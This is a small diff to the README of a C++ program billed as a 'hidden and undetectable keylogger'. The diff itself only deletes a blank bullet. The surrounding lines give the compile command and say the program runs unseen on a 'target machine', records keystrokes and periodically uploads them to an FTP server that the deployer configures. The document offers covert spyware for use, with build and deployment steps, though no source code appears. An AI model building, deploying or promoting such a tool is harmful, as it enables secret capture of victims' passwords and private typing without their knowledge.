@@ -8,7 +8,6 @@ A hidden and undetectable keylogger written in C++
 
 # Usage
 - If using MinGW (G++): g++ keylogger.cpp -o keylogger -lwininet
-- 
 - It is built to run in the background of a target machine and logs most keys that are pressed and after a specifed amount of time, sent over to the FTP server
 - Make sure when deploying to change the FTP contanst variables to an active FTP server
 
